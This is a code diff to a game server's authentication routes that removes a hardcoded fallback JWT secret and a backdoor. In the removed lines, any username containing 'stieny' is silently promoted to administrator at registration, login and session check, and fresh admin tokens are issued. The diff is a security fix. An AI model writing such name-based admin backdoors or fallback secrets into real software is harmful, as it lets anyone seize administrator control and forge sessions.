@@ -4,7 +4,11 @@ const jwt = require("jsonwebtoken");
 const engine = require("../game/engine");
 
 const router = express.Router();
-const JWT_SECRET = process.env.JWT_SECRET || "dev_secret_fallback_12345";
+
+if (!process.env.JWT_SECRET) {
+  throw new Error("CRITICAL: JWT_SECRET environment variable is required. Set it before starting the server.");
+}
+const JWT_SECRET = process.env.JWT_SECRET;
 
 module.exports = function (db) {
   router.post("/register", async (req, res) => {
@@ -40,13 +44,11 @@ module.exports = function (db) {
     const chosenRace = validRaces.includes(race) ? race : "human";
 
     try {
-      const usernameLower = username.toLowerCase();
-      const isAdminUser = usernameLower === "stieny" || usernameLower === "bigstieny" || usernameLower === "swaggyshane" || usernameLower.includes("stieny");
-      
       const hash = bcrypt.hashSync(password, 10);
+      const isAdminUser = false;
       const playerResult = await db.run(
         "INSERT INTO players (username, password, is_admin) VALUES (?, ?, ?)",
-        [username, hash, isAdminUser ? 1 : 0],
+        [username, hash, 0],
       );
       const region = engine.assignRegion(chosenRace);
 
@@ -157,13 +159,6 @@ module.exports = function (db) {
             (player.ban_reason ? ": " + player.ban_reason : ""),
         });
 
-    // Auto-promote stieny on login
-    const isStienyLogin = username.toLowerCase() === "stieny" || username.toLowerCase() === "bigstieny" || username.toLowerCase() === "swaggyshane" || username.toLowerCase().includes("stieny");
-    if (isStienyLogin && player.is_admin === 0) {
-      await db.run("UPDATE players SET is_admin = 1 WHERE id = ?", [player.id]);
-      player.is_admin = 1;
-    }
-
     const token = jwt.sign(
       { playerId: player.id, username, isAdmin: player.is_admin === 1 },
       JWT_SECRET,
@@ -195,35 +190,7 @@ module.exports = function (db) {
     if (!token) return res.status(401).json({ error: "Not authenticated" });
     try {
       let decoded = jwt.verify(token, JWT_SECRET);
-      
-      // Auto-promote check if Stieny
-      const usernameLower = decoded.username.toLowerCase();
-      const needsPromo = usernameLower === "stieny" || usernameLower === "bigstieny" || usernameLower === "swaggyshane" || usernameLower.includes("stieny");
-      if (needsPromo && !decoded.isAdmin) {
-        const player = await db.get("SELECT is_admin, id FROM players WHERE id = ?", [decoded.playerId]);
-        if (player) {
-          if (player.is_admin === 0) {
-            await db.run("UPDATE players SET is_admin = 1 WHERE id = ?", [player.id]);
-            player.is_admin = 1;
-          }
-          if (player.is_admin === 1) {
-            decoded.isAdmin = true;
-            const newToken = jwt.sign(
-              { playerId: player.id, username: decoded.username, isAdmin: true },
-              JWT_SECRET,
-              { expiresIn: "30d" }
-            );
-            const cookieOpts = {
-              httpOnly: true,
-              maxAge: 30 * 24 * 60 * 60 * 1000,
-              sameSite: "none",
-              secure: true,
-            };
-            res.cookie("token", newToken, cookieOpts);
-          }
-        }
-      }
-      
+
       res.json({
         playerId: decoded.playerId,
         username: decoded.username,
